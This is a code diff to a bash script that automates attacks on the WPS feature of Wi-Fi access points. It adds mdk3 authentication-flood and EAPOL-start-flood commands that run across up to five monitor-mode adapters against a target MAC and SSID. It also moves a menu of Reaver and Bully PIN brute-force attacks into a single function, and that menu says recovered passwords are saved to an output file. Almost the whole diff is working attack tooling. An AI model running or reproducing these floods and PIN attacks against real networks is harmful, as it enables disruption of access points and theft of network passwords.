@@ -1,5 +1,7 @@
 #!/bin/bash
 
+rfkill unblock all
+
 ########## DEBUG Mode ##########
 ##			      ##
         FLUX_DEBUG=0
@@ -1161,47 +1163,162 @@ run_mdk3_EAPOL1()
 
 run_mdk3_ASOC2()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
 	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
 }
 
 run_mdk3_EAPOL2()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
 	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
 }
 
 run_mdk3_ASOC3()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
 	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
 }
 
 run_mdk3_EAPOL3()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
 	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
 }
 
 run_mdk3_ASOC4()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
+ifconfig $WIFI_MONITOR4 up
+sleep 1
 	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
+ifconfig $WIFI_MONITOR4 down
+sleep 1
 }
 
 run_mdk3_EAPOL4()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
+ifconfig $WIFI_MONITOR4 up
+sleep 1
 	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
+ifconfig $WIFI_MONITOR4 down
+sleep 1
 }
 
 run_mdk3_ASOC5()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
+ifconfig $WIFI_MONITOR4 up
+sleep 1
+ifconfig $WIFI_MONITOR5 up
+sleep 1
 	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $mac -m"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
+ifconfig $WIFI_MONITOR4 down
+sleep 1
+ifconfig $WIFI_MONITOR5 down
+sleep 1
 }
 
 run_mdk3_EAPOL5()
 {
+sleep 1
+ifconfig $WIFI_MONITOR2 up
+sleep 1
+ifconfig $WIFI_MONITOR3 up
+sleep 1
+ifconfig $WIFI_MONITOR4 up
+sleep 1
+ifconfig $WIFI_MONITOR5 up
+sleep 1
 	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $mac -n $ssid -s 250"
+sleep 1
+ifconfig $WIFI_MONITOR2 down
+sleep 1
+ifconfig $WIFI_MONITOR3 down
+sleep 1
+ifconfig $WIFI_MONITOR4 down
+sleep 1
+ifconfig $WIFI_MONITOR5 down
+sleep 1
 }
 
 ##################################End Of Functions For MDK3 ########################################
 
+WPS_ATTACK_MENU()
+{
+mostrarheader
+echo "************** - Which Attack Would You Like To Use? - ************** 
+0)Select New Target Network
+1)EAPOL Start Flood 
+2)Authentication Flood
+3)Reaver
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+7)Bully
+8)Bully with AutoFlood(ASOC)
+9)Bully with AutoFlood(EAPOL)
 
+*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+}
+
+
+mostrarheader
 echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
 1)1 Adapter
 2)2 Adapters
@@ -1213,19 +1330,19 @@ read a
 case $a in
 	1)
 clear
-
+mostrarheader
 echo 
 read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 
 
 clear
-
+mostrarheader
 enable_mon_mode_1
 
 sleep 1
 
 clear
-
+mostrarheader
 echo "************** - Would you like to Change the Wlan WIFI_MONITOR's MAC Address? - ************** 
 1)Yes
 2)No"
@@ -1234,7 +1351,7 @@ read c
 case $c in
 	1)
 clear
-
+mostrarheader
 mac_change_1
 
 sleep 1
@@ -1251,24 +1368,13 @@ esac
 
 menu () {
 clear
-echo "************** - Which Attack Would You Like To Use? - ************** 
-0)Select New Target Network
-1)EAPOL Start Flood 
-2)Authentication Flood
-3)Reaver
-4)Check if Access Point WPS is UNLOCKED
-5)Reaver with AutoFlood(ASOC)
-6)Reaver with AutoFlood(EAPOL)
-7)Bully
-8)Bully with AutoFlood(ASOC)
-9)Bully with AutoFlood(EAPOL)
-
-*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+WPS_ATTACK_MENU
 
 read d
 case $d in
 	0)
 clear
+mostrarheader
 scan_for_targets
 enable_mon_mode_1
 menu
@@ -1405,19 +1511,7 @@ esac
 
 menu () {
 clear
-echo "************** - Which Attack Would You Like To Use? - ************** 
-0)Select New Target Network
-1)EAPOL Start Flood 
-2)Authentication Flood
-3)Reaver
-4)Check if Access Point WPS is UNLOCKED
-5)Reaver with AutoFlood(ASOC)
-6)Reaver with AutoFlood(EAPOL)
-7)Bully
-8)Bully with AutoFlood(ASOC)
-9)Bully with AutoFlood(EAPOL)
-
-*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+WPS_ATTACK_MENU
 
 read g
 case $g in
@@ -1569,19 +1663,7 @@ esac
 
 menu () {
 clear
-echo "************** - Which Attack Would You Like To Use? - ************** 
-0)Select New Target Network
-1)EAPOL Start Flood 
-2)Authentication Flood
-3)Reaver
-4)Check if Access Point WPS is UNLOCKED
-5)Reaver with AutoFlood(ASOC)
-6)Reaver with AutoFlood(EAPOL)
-7)Bully
-8)Bully with AutoFlood(ASOC)
-9)Bully with AutoFlood(EAPOL)
-
-*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+WPS_ATTACK_MENU
 
 read j
 case $j in
@@ -1738,19 +1820,7 @@ clear
 
 menu () {
 clear
-echo "************** - Which Attack Would You Like To Use? - ************** 
-0)Select New Target Network
-1)EAPOL Start Flood 
-2)Authentication Flood
-3)Reaver
-4)Check if Access Point WPS is UNLOCKED
-5)Reaver with AutoFlood(ASOC)
-6)Reaver with AutoFlood(EAPOL)
-7)Bully
-8)Bully with AutoFlood(ASOC)
-9)Bully with AutoFlood(EAPOL)
-
-*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+WPS_ATTACK_MENU
 
 read m
 case $m in
@@ -1912,19 +1982,7 @@ esac
 
 menu () {
 clear
-echo "************** - Which Attack Would You Like To Use? - ************** 
-0)Select New Target Network
-1)EAPOL Start Flood 
-2)Authentication Flood
-3)Reaver
-4)Check if Access Point WPS is UNLOCKED
-5)Reaver with AutoFlood(ASOC)
-6)Reaver with AutoFlood(EAPOL)
-7)Bully
-8)Bully with AutoFlood(ASOC)
-9)Bully with AutoFlood(EAPOL)
-
-*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
+WPS_ATTACK_MENU
 
 read p
 case $p in
